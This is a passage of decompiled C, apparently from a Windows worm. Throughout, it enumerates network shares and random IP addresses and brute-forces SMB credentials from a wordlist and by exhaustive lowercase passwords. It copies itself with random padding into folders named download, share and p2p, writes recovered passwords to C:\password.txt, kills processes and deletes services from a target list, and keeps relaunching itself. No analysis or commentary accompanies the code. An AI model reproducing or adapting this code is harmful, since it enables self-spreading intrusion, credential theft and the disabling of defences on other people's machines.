        LOBYTE(v7) = *v6;
        BYTE1(v7) = *v5 - *v6;
        if ( *v5 != *v6 )
          break;
        if ( !(_BYTE)v7 )
          goto LABEL_14;
        ++v6;
        ++v5;
      }
      v7 = -(*v5 < (unsigned __int8)*v6) - ((*v5 < (unsigned __int8)*v6) - 1);
LABEL_14:
      if ( !v7 && ++i >= cCount )
        break;
      v8 = *((_DWORD *)lpBuffer + 8 * i + 2);
      if ( v8 == 2 )
      {
        v9 = (char *)*((_DWORD *)lpBuffer + 8 * i + 5);
        v10 = (char *)(v17 - v9);
        do
        {
          v11 = *v9;
          v9[(_DWORD)v10] = *v9;
          ++v9;
        }
        while ( v11 );
        sub_401D40(v17);
        if ( sub_4032F0(v17) != -1 )
        {
          if ( sub_402C20(*((CHAR **)lpBuffer + 8 * i + 5)) )
          {
            if ( !sub_402B20(*((CHAR **)lpBuffer + 8 * i + 5), lpUserName, (int)v13)
              || !sub_402A20(*((CHAR **)lpBuffer + 8 * i + 5), lpUserName, (int)v13) )
            {
              sub_401590(a2, *((const char **)lpBuffer + 8 * i + 5), lpUserName, v13);
            }
          }
          else
          {
            sub_401590(a2, *((const char **)lpBuffer + 8 * i + 5), 0, 0);
          }
        }
      }
      else if ( v8 == 3 && *((_DWORD *)lpBuffer + 8 * i + 1) == 1 )
      {
        sub_4013B0(a2, *((char **)lpBuffer + 8 * i + 5), lpUserName, v13);
      }
      sub_401640((LPNETRESOURCEA)lpBuffer + i, (int)a2);
    }
    if ( !GetLastError )
      WNetCancelConnection2A(*((LPCSTR *)lpBuffer + 8 * i + 5), 0, 0);
  }
  sub_4021E0("Error:");
  LastError = GetLastError();
  sub_4022E0(LastError);
  WNetCloseEnum(hEnum);
  sub_404670((char *)lpBuffer);
  return 0;
}
// 401640: using guessed type CHAR var_225[13];

//----- (00401970) --------------------------------------------------------
void __cdecl __noreturn sub_401970(BYTE *a1)
{
  int v1[3]; // [esp+Fh] [ebp-31h] BYREF
  LPCSTR lpUserName; // [esp+1Ch] [ebp-24h] BYREF
  int v3; // [esp+20h] [ebp-20h] BYREF
  int v4; // [esp+24h] [ebp-1Ch] BYREF
  int v5; // [esp+28h] [ebp-18h] BYREF
  int v6; // [esp+2Ch] [ebp-14h] BYREF
  CHAR v7[16]; // [esp+30h] [ebp-10h] BYREF

  strcpy((char *)&lpUserName, "+Ã@");
  while ( 1 )
  {
    sub_401000(&v6, &v5, &v4, &v3);
    sub_4046D0((int)v7, "%i.%i.%i.%i", v6, v5, v4, v3);
    if ( sub_4032F0(v7) != -1 && (!sub_402B20(v7, lpUserName, (int)v1) || !sub_402A20(v7, lpUserName, (int)v1)) )
      sub_401590(a1, v7, 0, 0);
    Sleep(0x64u);
  }
}
// 401970: using guessed type CHAR var_10[16];

//----- (00401A40) --------------------------------------------------------
void __cdecl __noreturn sub_401A40(BYTE *a1)
{
  sub_401640(0, a1);
  sub_401970(a1);
}

//----- (00401A70) --------------------------------------------------------
void __noreturn sub_401A70()
{
  char *v0; // eax
  int v1; // ebx
  int v2; // eax
  _BYTE v3[8]; // [esp-184h] [ebp-188h] BYREF
  DWORD v4; // [esp-17Ch] [ebp-180h] BYREF
  char *v5; // [esp-176h] [ebp-17Ah]
  CHAR v6[255]; // [esp-172h] [ebp-176h] BYREF
  CHAR v7[4]; // [esp-73h] [ebp-77h] BYREF
  char v8[7]; // [esp-6Fh] [ebp-73h] BYREF
  _BYTE v9[108]; // [esp-68h] [ebp-6Ch] BYREF

  strcpy(v8, "_:\\*.*");
  v4 = 255;
  sub_404710();
  v5 = v0;
  qmemcpy(v7, " :", sizeof(v7));
  qmemcpy(v3, &unk_40C307, sizeof(v3));
  GetModuleFileNameA(0, v6, 0xFFu);
  sub_401340(v6);
  sub_401080(v9);
  v1 = 0;
  while ( 1 )
  {
    v2 = *(_DWORD *)&v9[4 * v1];
    if ( v2 == 3 || v2 == 4 || v2 == 6 )
    {
      v8[0] = v1 + 65;
      if ( *(_DWORD *)&v9[4 * v1] == 4 )
      {
        v7[0] = v1 + 65;
        if ( !WNetGetConnectionA(v7, v5, &v4) )
          sub_4013B0((BYTE *)v6, v5, 0, 0);
      }
      else
      {
        sub_4020B0((BOOL)&unk_40C307 + 8, v8);
      }
    }
    if ( ++v1 >= 27 )
      sub_401A40((BYTE *)v6);
  }
}
// 401AA7: variable 'v0' is possibly undefined
// 401A70: using guessed type void __noreturn sub_401A70();

//----- (00401B90) --------------------------------------------------------
int __stdcall sub_401B90(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // eax
  HANDLE v6; // eax
  HANDLE v7; // ebx
  struct _SYSTEMTIME v9; // [esp-20h] [ebp-24h] BYREF
  DWORD v10; // [esp-10h] [ebp-14h] BYREF
  struct _SECURITY_ATTRIBUTES v11; // [esp-Ch] [ebp-10h] BYREF

  GetLocalTime(&v9);
  if ( sub_401CB0() >= 4 )
  {
    v4 = sub_404760(0);
    sub_4047B0(v4);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, &v10);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_4026B0, 0, 0, &v10);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402830, 0, 0, &v10);
    sub_402430();
    v5 = sub_403680();
    Sleep(v5 % 1000 + 1);
    v11.nLength = 12;
    v11.lpSecurityDescriptor = 0;
    v11.bInheritHandle = 0;
    do
    {
      v6 = OpenMutexA(0x100000u, 0, "mutex666");
      v7 = v6;
      if ( v6 )
      {
        ReleaseMutex(v6);
      }
      else
      {
        v7 = CreateMutexA(&v11, 0, "mutex666");
        if ( v7 )
          sub_401A70();
      }
      Sleep(0x64u);
      CloseHandle(v7);
    }
    while ( v7 );
  }
  return 0;
}
// 401A70: using guessed type void __noreturn sub_401A70(void);

//----- (00401C90) --------------------------------------------------------
int __cdecl sub_401C90(int a1, int a2)
{
  return sub_403680() % a2 + a1;
}

//----- (00401CB0) --------------------------------------------------------
DWORD sub_401CB0()
{
  struct _OSVERSIONINFOA v1; // [esp-94h] [ebp-98h] BYREF

  v1.dwOSVersionInfoSize = 148;
  if ( GetVersionExA(&v1) )
    return v1.dwMajorVersion;
  else
    return GetLastError();
}

//----- (00401CF0) --------------------------------------------------------
unsigned int __usercall sub_401CF0@<eax>(unsigned int result@<eax>, _BYTE *a2)
{
  unsigned int i; // ecx

  if ( *a2 == 92 && a2[1] == 92 )
  {
    for ( i = 2; ; ++i )
    {
      result = -1;
      do
        ++result;
      while ( a2[result] );
      if ( i >= result )
        break;
      if ( a2[i] == 92 )
      {
        a2[i] = 0;
        return result;
      }
    }
  }
  return result;
}

//----- (00401D40) --------------------------------------------------------
void __cdecl sub_401D40(_BYTE *a1)
{
  unsigned int i; // ecx
  unsigned int v2; // eax

  if ( *a1 == 92 && a1[1] == 92 )
  {
    for ( i = 2; ; ++i )
    {
      v2 = -1;
      do
        ++v2;
      while ( a1[v2] );
      if ( i >= v2 )
        break;
      a1[i - 2] = a1[i];
    }
    a1[i - 2] = 0;
  }
}

//----- (00401D90) --------------------------------------------------------
BOOL __cdecl sub_401D90(const CHAR *a1, const CHAR *a2)
{
  DWORD v2; // esi
  _DWORD *v3; // ebx
  DWORD i; // edi
  BOOL v6; // [esp-20h] [ebp-24h]
  DWORD v7; // [esp-1Ch] [ebp-20h] BYREF
  HANDLE v8; // [esp-18h] [ebp-1Ch]
  HANDLE FileMappingA; // [esp-14h] [ebp-18h]
  HANDLE FileA; // [esp-10h] [ebp-14h]
  BOOL v11; // [esp-Ch] [ebp-10h]
  HANDLE v12; // [esp-8h] [ebp-Ch]
  HANDLE v13; // [esp-4h] [ebp-8h]

  v2 = (sub_403680() & 0x1FFFFF) + 1024;
  v3 = sub_403DC0(4 * v2);
  FileA = CreateFileA(a1, 0x80000000, 1u, 0, 3u, 0, 0);
  FileMappingA = CreateFileMappingA(FileA, 0, 2u, 0, 0, 0);
  v8 = MapViewOfFile(FileMappingA, 4u, 0, 0, 0);
  v12 = v8;
  v13 = CreateFileA(a2, 0xC0000000, 1u, 0, 2u, 0x80u, 0);
  v11 = WriteFile(v13, v8, 0x14DFCu, &v7, 0);
  if ( v11 && v3 )
  {
    for ( i = 0; i < v2; ++i )
      v3[i] = sub_403680() % 0x7FFFFFFF;
    SetFilePointer(v13, 0, 0, 2u);
    v6 = WriteFile(v13, v3, v2, &v7, 0);
  }
  sub_404670((char *)v3);
  CloseHandle(FileA);
  CloseHandle(FileMappingA);
  CloseHandle(v8);
  CloseHandle(v13);
  return !v11 || !v6;
}
// 401ECD: variable 'v6' is possibly undefined

//----- (00401EE0) --------------------------------------------------------
char *__cdecl sub_401EE0(int a1, int a2)
{
  int v2; // eax
  int i; // ebx
  char v5[1024]; // [esp+Ch] [ebp-404h] BYREF
  int v6; // [esp+40Ch] [ebp-4h]

  qmemcpy(v5, &unk_40C4DC, sizeof(v5));
  v2 = -1;
  do
    ++v2;
  while ( *(_BYTE *)(a1 + v2) );
  v6 = v2;
  if ( v2 < a2 || !a2 || v2 >= 1024 )
    return (char *)a1;
  for ( i = 0; i <= v6 - a2 - 1; ++i )
    v5[i] = *(_BYTE *)(a1 + i);
  v5[i + 1] = 0;
  return v5;
}

//----- (00401F60) --------------------------------------------------------
_BYTE *__cdecl sub_401F60(const char *a1, _BYTE *a2)
{
  int v2; // eax
  _BYTE *result; // eax
  char v4[1024]; // [esp+Dh] [ebp-8FFh] BYREF
  char v5[1024]; // [esp+40Dh] [ebp-4FFh] BYREF
  CHAR Filename[255]; // [esp+80Dh] [ebp-FFh] BYREF

  qmemcpy(Filename, &unk_40C8DC, sizeof(Filename));
  v2 = -1;
  do
    ++v2;
  while ( a2[v2] );
  sub_4023A0((int)a2, v2);
  if ( sub_4047D0(a2, "tmp")
    || sub_4047D0(a2, "download")
    || sub_4047D0(a2, "temp")
    || sub_4047D0(a2, "share")
    || sub_4047D0(a2, "p2p")
    || (result = sub_4047D0(a2, "incoming")) != 0 )
  {
    strcpy(v5, a1);
    sub_403780(v5, "\\");
    sub_402F20(v4);
    sub_403780(v5, v4);
    sub_403780(v5, ".exe");
    GetModuleFileNameA(0, Filename, 0xFFu);
    return (_BYTE *)sub_401D90(Filename, v5);
  }
  return result;
}

//----- (004020B0) --------------------------------------------------------
int __usercall sub_4020B0@<eax>(BOOL NextFileA@<esi>, LPCSTR lpFileName)
{
  HANDLE FirstFileA; // edi
  CHAR *cFileName; // ecx
  const char *v5; // edx
  int v6; // eax
  CHAR *v7; // ecx
  const char *v8; // edx
  int v9; // eax
  char *v10; // edx
  CHAR *v11; // ecx
  char v12; // al
  CHAR FileName[1024]; // [esp+Ch] [ebp-400h] BYREF

  FirstFileA = FindFirstFileA(lpFileName, &FindFileData);
  if ( FirstFileA == (HANDLE)-1 )
    return 0;
  do
  {
    if ( !NextFileA )
      break;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      cFileName = FindFileData.cFileName;
      v5 = ".";
      HIWORD(v6) = 0;
      while ( 1 )
      {
        LOBYTE(v6) = *v5;
        BYTE1(v6) = *cFileName - *v5;
        if ( *cFileName != *v5 )
          break;
        if ( !(_BYTE)v6 )
          goto LABEL_9;
        ++v5;
        ++cFileName;
      }
      v6 = -((unsigned __int8)*cFileName < (unsigned int)*v5) - (((unsigned __int8)*cFileName < (unsigned int)*v5) - 1);
LABEL_9:
      if ( v6 )
      {
        v7 = FindFileData.cFileName;
        v8 = "..";
        HIWORD(v9) = 0;
        while ( 1 )
        {
          LOBYTE(v9) = *v8;
          BYTE1(v9) = *v7 - *v8;
          if ( *v7 != *v8 )
            break;
          if ( !(_BYTE)v9 )
            goto LABEL_15;
          ++v8;
          ++v7;
        }
        v9 = -((unsigned __int8)*v7 < (unsigned int)*v8) - (((unsigned __int8)*v7 < (unsigned int)*v8) - 1);
LABEL_15:
        if ( v9 )
        {
          v10 = sub_401EE0((int)lpFileName, 3);
          v11 = (CHAR *)(FileName - v10);
          do
          {
            v12 = *v10;
            v10[(_DWORD)v11] = *v10;
            ++v10;
          }
          while ( v12 );
          sub_403780(FileName, FindFileData.cFileName);
          sub_401F60(FileName, FindFileData.cFileName);
          sub_403780(FileName, "\\*.*");
          sub_4020B0(FileName);
          FileName[0] = 0;
        }
      }
    }
    NextFileA = FindNextFileA(FirstFileA, &FindFileData);
  }
  while ( NextFileA );
  FindClose(FirstFileA);
  return 0;
}

//----- (004021E0) --------------------------------------------------------
int __cdecl sub_4021E0(const char *a1)
{
  char *v1; // ebx
  unsigned int v3; // [esp-14h] [ebp-18h] BYREF
  unsigned int *v4; // [esp-10h] [ebp-14h]
  char v5[14]; // [esp-Ah] [ebp-Eh] BYREF

  qmemcpy(v5, &unk_40CA14, 0xAu);
  v1 = (char *)sub_404830("C:\\debug.txt", "a");
  sub_404760(&v3);
  v4 = sub_404920(&v3);
  sub_404940(v5, 0xAu, "%H:%M:%S", (int)v4);
  sub_4049A0((int)v1, "%s -> %s\n", v5, a1);
  return sub_404A20(v1);
}
// 4021E0: could not find valid save-restore pair for ebx

//----- (004022E0) --------------------------------------------------------
int __cdecl sub_4022E0(int a1)
{
  char *v1; // ebx
  unsigned int v3; // [esp+Ch] [ebp-14h] BYREF
  unsigned int *v4; // [esp+10h] [ebp-10h]
  char v5[9]; // [esp+17h] [ebp-9h] BYREF

  qmemcpy(v5, &unk_40CA27, sizeof(v5));
  v1 = (char *)sub_404830("C:\\debug.txt", "a");
  sub_404760(&v3);
  v4 = sub_404920(&v3);
  sub_404940(v5, 9u, "%H:%M:%S", (int)v4);
  sub_4049A0((int)v1, "%s -> %i\n", v5, a1);
  return sub_404A20(v1);
}

//----- (00402360) --------------------------------------------------------
int __cdecl sub_402360(const char *a1)
{
  char *v1; // ebx

  v1 = (char *)sub_404830("C:\\password.txt", "a");
  sub_4049A0((int)v1, " %s\n", a1);
  return sub_404A20(v1);
}

//----- (004023A0) --------------------------------------------------------
int __cdecl sub_4023A0(int a1, int a2)
{
  int i; // edi
  int result; // eax

  for ( i = 0; i < a2; ++i )
  {
    result = a1 + i;
    *(_BYTE *)(a1 + i) = *((_WORD *)off_415A60 + *(char *)(a1 + i));
  }
  return result;
}
// 415A60: using guessed type void *off_415A60;

//----- (004023D0) --------------------------------------------------------
int __cdecl sub_4023D0(int a1, int a2)
{
  int i; // edi
  int result; // eax

  for ( i = 0; i < a2; ++i )
  {
    result = a1 + i;
    *(_BYTE *)(a1 + i) = *((_WORD *)off_415A64 + *(char *)(a1 + i));
  }
  return result;
}
// 415A64: using guessed type void *off_415A64;

//----- (00402430) --------------------------------------------------------
BOOL sub_402430()
{
  SC_HANDLE v0; // ebx
  SC_HANDLE v1; // eax
  SC_HANDLE v2; // esi
  void *ScLock; // [esp+Ch] [ebp-8h]

  v0 = OpenSCManagerA(0, 0, 0xF003Fu);
  ScLock = LockServiceDatabase(v0);
  if ( v0 )
  {
    v1 = OpenServiceA(v0, "Messenger", 0);
    v2 = v1;
    if ( v1 && ChangeServiceConfigA(v1, 0xFFFFFFFF, 2u, 0, 0, 0, 0, 0, 0, 0, &DisplayName) )
    {
      while ( 1 )
      {
        Sleep(0x64u);
        StartServiceA(v2, 0, 0);
      }
    }
    CloseServiceHandle(v2);
  }
  UnlockServiceDatabase(ScLock);
  return CloseServiceHandle(v0);
}

//----- (004024E0) --------------------------------------------------------
int __cdecl sub_4024E0(char *a1)
{
  SC_HANDLE v1; // ebx
  struct _ENUM_SERVICE_STATUSA *v2; // esi
  DWORD i; // edi
  LPSTR lpServiceName; // edx
  char *v5; // ecx
  CHAR v6; // al
  int v7; // eax
  struct _SERVICE_STATUS ServiceStatus; // [esp+Ch] [ebp-154h] BYREF
  DWORD pcbBytesNeeded; // [esp+28h] [ebp-138h] BYREF
  struct _ENUM_SERVICE_STATUSA Services; // [esp+2Ch] [ebp-134h] BYREF
  DWORD ServicesReturned; // [esp+50h] [ebp-110h] BYREF
  DWORD ResumeHandle; // [esp+54h] [ebp-10Ch] BYREF
  BOOL v14; // [esp+58h] [ebp-108h]
  char v15[255]; // [esp+5Dh] [ebp-103h] BYREF
  SC_HANDLE hService; // [esp+15Ch] [ebp-4h]

  hService = 0;
  v14 = 1;
  v1 = OpenSCManagerA(0, 0, 0xF003Fu);
  ResumeHandle = 0;
  if ( v1 )
  {
    v14 = EnumServicesStatusA(v1, 0x30u, 1u, &Services, 0x24u, &pcbBytesNeeded, &ServicesReturned, &ResumeHandle);
    if ( !v14 || GetLastError() == 234 )
    {
      v2 = (struct _ENUM_SERVICE_STATUSA *)sub_403DC0(pcbBytesNeeded);
      if ( v2
        && !GetLastError()
        && EnumServicesStatusA(
             v1,
             0x30u,
             1u,
             v2,
             pcbBytesNeeded + 36,
             &pcbBytesNeeded,
             &ServicesReturned,
             &ResumeHandle) )
      {
        for ( i = 0; i < ServicesReturned; ++i )
        {
          lpServiceName = v2[i].lpServiceName;
          v5 = (char *)(v15 - lpServiceName);
          do
          {
            v6 = *lpServiceName;
            lpServiceName[(_DWORD)v5] = *lpServiceName;
            ++lpServiceName;
          }
          while ( v6 );
          v7 = -1;
          do
            ++v7;
          while ( v15[v7] );
          sub_4023D0((int)v15, v7);
          if ( sub_4047D0(v15, a1) )
          {
            hService = OpenServiceA(v1, v2[i].lpServiceName, 0x20u);
            if ( hService )
            {
              ControlService(hService, 1u, &ServiceStatus);
              CloseServiceHandle(hService);
              Sleep(0xFA0u);
              hService = OpenServiceA(v1, v2[i].lpServiceName, 0x10000u);
              DeleteService(hService);
            }
            CloseServiceHandle(hService);
          }
        }
      }
      sub_404670((char *)v2);
    }
  }
  CloseServiceHandle(v1);
  return 0;
}
// 4024E0: using guessed type char var_103[255];

//----- (004026B0) --------------------------------------------------------
void __stdcall __noreturn sub_4026B0(LPVOID lpThreadParameter)
{
  int i; // ebx

  while ( 1 )
  {
    for ( i = 0; off_413000[i]; ++i )
      sub_4024E0(off_413000[i]);
    Sleep(0x2710u);
  }
}
// 413000: using guessed type char *off_413000[254];

//----- (004026F0) --------------------------------------------------------
BOOL __stdcall EnumFunc(HWND hWnd, LPARAM a2)
{
  int v2; // esi
  int v3; // eax
  HANDLE v4; // edi
  DWORD dwProcessId; // [esp+Ch] [ebp-104h] BYREF
  CHAR String[255]; // [esp+11h] [ebp-FFh] BYREF

  dwProcessId = 0;
  v2 = 0;
  GetWindowTextA(hWnd, String, 254);
  v3 = -1;
  do
    ++v3;
  while ( String[v3] );
  sub_4023D0((int)String, v3);
  while ( off_413000[v2] )
  {
    if ( sub_4047D0(String, off_413000[v2]) )
    {
      GetWindowThreadProcessId(hWnd, &dwProcessId);
      v4 = OpenProcess(0x1F0FFFu, 0, dwProcessId);
      TerminateProcess(v4, 0);
      CloseHandle(v4);
    }
    ++v2;
  }
  return 1;
}
// 413000: using guessed type char *off_413000[254];
// 4026F0: using guessed type CHAR String[255];

//----- (004027B0) --------------------------------------------------------
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  while ( 1 )
  {
    EnumWindows(EnumFunc, 0);
    Sleep(0xC8u);
  }
}

//----- (004027D0) --------------------------------------------------------
char __cdecl sub_4027D0(int a1)
{
  int v1; // eax
  int i; // esi
  int v3; // esi
  int j; // ecx
  int v6; // [esp+8h] [ebp-4h]

  v1 = -1;
  do
    ++v1;
  while ( *(_BYTE *)(a1 + v1) );
  v6 = v1;
  for ( i = v1; i >= 0 && *(_BYTE *)(a1 + i) != 92; --i )
    ;
  v3 = i + 1;
  for ( j = 0; j <= v6; ++j )
  {
    LOBYTE(v1) = *(_BYTE *)(a1 + v3 + j);
    *(_BYTE *)(a1 + j) = v1;
  }
  *(_BYTE *)(a1 + j + 1) = 0;
  return v1;
}

//----- (00402830) --------------------------------------------------------
void __stdcall __noreturn sub_402830(LPVOID lpThreadParameter)
{
  int v1; // ebx
  HANDLE Toolhelp32Snapshot; // edi
  CHAR *szExeFile; // edx
  CHAR v4; // al
  int v5; // eax
  char *v6; // ecx
  char *v7; // edx
  int v8; // eax
  int v9; // eax
  char *v10; // ecx
  char *v11; // edx
  int v12; // eax
  HANDLE v13; // eax
  int v14; // [esp+Ch] [ebp-22Ch]
  PROCESSENTRY32 pe; // [esp+10h] [ebp-228h] BYREF
  char v16[255]; // [esp+139h] [ebp-FFh] BYREF

  GetModuleFileNameA(0, File, 0xFFu);
  strcpy(byte_4134FF, File);
  sub_4027D0((int)byte_4134FF);
  while ( 1 )
  {
    Sleep(0x7D0u);
    v14 = 0;
    v1 = 0;
    Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
    if ( Toolhelp32Snapshot != (HANDLE)-1 )
    {
      pe.dwSize = 296;
      if ( Process32First(Toolhelp32Snapshot, &pe) )
      {
        while ( Process32Next(Toolhelp32Snapshot, &pe) )
        {
          szExeFile = pe.szExeFile;
          do
          {
            v4 = *szExeFile;
            szExeFile[261] = *szExeFile;
            ++szExeFile;
          }
          while ( v4 );
          v5 = -1;
          do
            ++v5;
          while ( v16[v5] );
          sub_4023A0((int)v16, v5);
          v6 = v16;
          v7 = byte_4134FF;
          HIWORD(v8) = 0;
          while ( 1 )
          {
            LOBYTE(v8) = *v7;
            BYTE1(v8) = *v6 - *v7;
            if ( *v6 != *v7 )
              break;
            if ( !(_BYTE)v8 )
              goto LABEL_14;
            ++v7;
            ++v6;
          }
          v8 = -((unsigned __int8)*v6 < (unsigned __int8)*v7) - (((unsigned __int8)*v6 < (unsigned __int8)*v7) - 1);
LABEL_14:
          if ( !v8 )
            ++v14;
          v9 = -1;
          do
            ++v9;
          while ( v16[v9] );
          sub_4023D0((int)v16, v9);
          while ( off_413000[v1] )
          {
            v10 = v16;
            v11 = off_413000[0];
            HIWORD(v12) = 0;
            while ( 1 )
            {
              LOBYTE(v12) = *v11;
              BYTE1(v12) = *v10 - *v11;
              if ( *v10 != *v11 )
                break;
              if ( !(_BYTE)v12 )
                goto LABEL_24;
              ++v11;
              ++v10;
            }
            v12 = -((unsigned __int8)*v10 < (unsigned __int8)*v11)
                - (((unsigned __int8)*v10 < (unsigned __int8)*v11)
                 - 1);
LABEL_24:
            if ( !v12 )
            {
              v13 = OpenProcess(0x1F0FFFu, 0, pe.th32ProcessID);
              TerminateProcess(v13, 0);
            }
            ++v1;
          }
        }
      }
      CloseHandle(Toolhelp32Snapshot);
    }
    if ( v14 <= 2 )
    {
      ShellExecuteA(0, 0, File, 0, 0, 1);
      Sleep(0x64u);
    }
  }
}
// 413000: using guessed type char *off_413000[254];
// 402830: using guessed type char var_FF[255];

//----- (00402A20) --------------------------------------------------------
int __cdecl sub_402A20(CHAR *a1, const CHAR *a2, int a3)
{
  DWORD v3; // eax
  unsigned int i; // edi
  struct _NETRESOURCEA v6; // [esp-24h] [ebp-28h] BYREF
  int v7; // [esp-4h] [ebp-8h]

  Password = 97;
  byte_4159C9 = 0;
  v6.dwScope = 2;
  v6.dwType = 1;
  v6.dwDisplayType = 3;
  v6.dwUsage = 1;
  v6.lpLocalName = 0;
  v6.lpRemoteName = a1;
  v6.lpComment = 0;
  v6.lpProvider = 0;
  v7 = 0;
  while ( 1 )
  {
    if ( ++Password > 122 )
      sub_402CA0(1);
    v3 = WNetAddConnection2A(&v6, &Password, a2, 0);
    if ( v3 == 1208 )
    {
      WNetCancelConnection2A(0, 1u, 1);
      return 2;
    }
    if ( !v3 || v3 == 85 )
      break;
    if ( ++v7 >= 15625 )
    {
      WNetCancelConnection2A(0, 1u, 1);
      return 1;
    }
  }
  for ( i = 0; i <= (unsigned int)sub_404B00(&Password); ++i )
    *(_BYTE *)(a3 + i) = *(&Password + i);
  WNetCancelConnection2A(0, 1u, 1);
  return 0;
}
// 4159C9: using guessed type char byte_4159C9;

//----- (00402B20) --------------------------------------------------------
int __cdecl sub_402B20(CHAR *a1, LPCSTR lpUserName, int a3)
{
  int v3; // esi
  int result; // eax
  unsigned int i; // edi
  unsigned int v6; // eax
  unsigned int v7; // kr00_4
  struct _NETRESOURCEA NetResource; // [esp+10h] [ebp-24h] BYREF
  DWORD v9; // [esp+30h] [ebp-4h]

  v3 = 0;
  NetResource.dwScope = 2;
  NetResource.dwType = 1;
  NetResource.dwDisplayType = 3;
  NetResource.dwUsage = 1;
  NetResource.lpLocalName = 0;
  NetResource.lpRemoteName = a1;
  NetResource.lpComment = 0;
  NetResource.lpProvider = 0;
  while ( 1 )
  {
    if ( (&lpPassword)[v3] == (LPCSTR)&unk_40D2F8 )
    {
      WNetCancelConnection2A(0, 1u, 1);
      v7 = __readeflags();
      result = 1;
      __writeeflags(v7);
      return result;
    }
    v9 = WNetAddConnection2A(&NetResource, (&lpPassword)[v3], lpUserName, 0);
    if ( v9 == 1208 )
    {
      WNetCancelConnection2A(0, 1u, 1);
      return 2;
    }
    if ( !v9 || v9 == 85 )
      break;
    ++v3;
  }
  for ( i = 0; ; ++i )
  {
    v6 = -1;
    do
      ++v6;
    while ( (&lpPassword)[v3][v6] );
    if ( i > v6 )
      break;
    *(_BYTE *)(a3 + i) = (&lpPassword)[v3][i];
  }
  WNetCancelConnection2A(0, 1u, 1);
  return 0;
}

//----- (00402C20) --------------------------------------------------------
int __cdecl sub_402C20(CHAR *a1)
{
  struct _NETRESOURCEA v2; // [esp-20h] [ebp-24h] BYREF

  v2.dwScope = 2;
  v2.dwType = 1;
  v2.dwDisplayType = 3;
  v2.dwUsage = 1;
  v2.lpLocalName = 0;
  v2.lpRemoteName = a1;
  v2.lpComment = 0;
  v2.lpProvider = 0;
  if ( WNetAddConnection2A(&v2, 0, 0, 0) )
  {
    WNetCancelConnection2A(a1, 1u, 1);
    return 1;
  }
  else
  {
    WNetCancelConnection2A(a1, 1u, 1);
    return 0;
  }
}

//----- (00402CA0) --------------------------------------------------------
CHAR *__cdecl sub_402CA0(int a1)
{
  CHAR *result; // eax

  byte_4159C7[a1] = 97;
  if ( *(&Password + a1) >= 97 )
  {
    result = &Password + a1;
    ++*(&Password + a1);
  }
  else
  {
    *(&Password + a1) = 97;
  }
  if ( *(&Password + a1) > 122 )
    return (CHAR *)sub_402CA0(a1 + 1);
  return result;
}

//----- (00402CE0) --------------------------------------------------------
int __cdecl sub_402CE0(int a1)
{
  char *v1; // edx
  int v2; // ecx
  char v3; // al
  _BYTE v5[84]; // [esp-50h] [ebp-54h] BYREF

  qmemcpy(v5, off_410E64, 0x50u);
  v1 = *(char **)&v5[4 * (sub_403680() % 20)];
  v2 = a1 - (_DWORD)v1;
  do
  {
    v3 = *v1;
    v1[v2] = *v1;
    ++v1;
  }
  while ( v3 );
  return a1;
}
// 410E64: using guessed type char *off_410E64[133];

//----- (00402D30) --------------------------------------------------------
int __cdecl sub_402D30(int a1)
{
  char *v1; // edx
  int v2; // ecx
  char v3; // al
  _BYTE v5[84]; // [esp-50h] [ebp-54h] BYREF

  qmemcpy(v5, off_410EB4, 0x50u);
  v1 = *(char **)&v5[4 * (sub_403680() % 20)];
  v2 = a1 - (_DWORD)v1;
  do
  {
    v3 = *v1;
    v1[v2] = *v1;
    ++v1;
  }
  while ( v3 );
  return a1;
}
// 410EB4: using guessed type char *off_410EB4[113];

//----- (00402D80) --------------------------------------------------------
int __cdecl sub_402D80(int a1)
{
  char *v1; // edx
  int v2; // ecx
  char v3; // al
  int v5[39]; // [esp+Ch] [ebp-9Ch] BYREF

  qmemcpy(v5, off_410F04, sizeof(v5));
  v1 = (char *)v5[sub_403680() % 41];
  v2 = a1 - (_DWORD)v1;
  do
  {
    v3 = *v1;
    v1[v2] = *v1;
    ++v1;
  }
  while ( v3 );
  return a1;
}
// 410F04: using guessed type char *off_410F04[93];
// 402D80: using guessed type int var_9C[39];

//----- (00402DE0) --------------------------------------------------------
int __cdecl sub_402DE0(int a1)
{
  char *v1; // edx
  int v2; // ecx
  char v3; // al
  int v5[10]; // [esp+Ch] [ebp-28h] BYREF

  qmemcpy(v5, off_410FA0, sizeof(v5));
  v1 = (char *)v5[sub_403680() % 10];
  v2 = a1 - (_DWORD)v1;
  do
  {
    v3 = *v1;
    v1[v2] = *v1;
    ++v1;
  }
  while ( v3 );
  return a1;
}
// 410FA0: using guessed type char *off_410FA0[54];
// 402DE0: using guessed type int var_28[10];

//----- (00402E30) --------------------------------------------------------
int __cdecl sub_402E30(int a1)
{
  char *v1; // edx
  int v2; // ecx
  char v3; // al
  int v5[17]; // [esp+Ch] [ebp-44h] BYREF

  qmemcpy(v5, off_410FC8, sizeof(v5));
  v1 = (char *)v5[sub_403680() % 17];
  v2 = a1 - (_DWORD)v1;
  do
  {
    v3 = *v1;
    v1[v2] = *v1;
    ++v1;
  }
  while ( v3 );
  return a1;
}
// 410FC8: using guessed type char *off_410FC8[44];
// 402E30: using guessed type int var_44[17];

//----- (00402E80) --------------------------------------------------------
int __cdecl sub_402E80(int a1)
{
  char *v1; // edx
  int v2; // ecx
  char v3; // al
  int v5[24]; // [esp+Ch] [ebp-60h] BYREF

  qmemcpy(v5, off_41100C, sizeof(v5));
  v1 = (char *)v5[sub_403680() % 24];
  v2 = a1 - (_DWORD)v1;
  do
  {
    v3 = *v1;
    v1[v2] = *v1;
    ++v1;
  }
  while ( v3 );
  return a1;
}
// 41100C: using guessed type char *off_41100C[27];
// 402E80: using guessed type int var_60[24];

//----- (00402ED0) --------------------------------------------------------
int __cdecl sub_402ED0(int a1)
{
  char *v1; // edx
  int v2; // ecx
  char v3; // al
  int v5[5]; // [esp+Ch] [ebp-14h] BYREF

  qmemcpy(v5, off_41106C, sizeof(v5));
  v1 = (char *)v5[sub_403680() % 5];
  v2 = a1 - (_DWORD)v1;
  do
  {
    v3 = *v1;
    v1[v2] = *v1;
    ++v1;
  }
  while ( v3 );
  return a1;
}
// 41106C: using guessed type char *off_41106C[3];
// 402ED0: using guessed type int var_14[5];

